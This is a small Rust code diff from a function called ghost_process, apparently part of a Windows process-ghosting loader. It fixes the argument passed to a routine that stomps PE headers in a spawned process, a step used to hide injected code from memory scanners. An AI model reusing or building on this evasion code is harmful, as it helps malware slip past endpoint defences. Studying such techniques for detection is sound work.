@@ -465,7 +465,7 @@ pub unsafe fn ghost_process(config: &Config) -> Option<State> { unsafe {
     debug!("[GHOST] NtWaitForSingleObject reuslt: 0x{:08X}", wait_result);
     if wait_result == 0x00000102u32 as i32 {
         // Process still alive after loader init, stomp the headers
-        stomp_pe_headers(state.process_handle, remote_params_base as *mut c_void);
+        stomp_pe_headers(state.process_handle, remote_image_base as *mut c_void);
     }
 
     debug!("[GHOST] Process Handle: {:p}", state.process_handle);
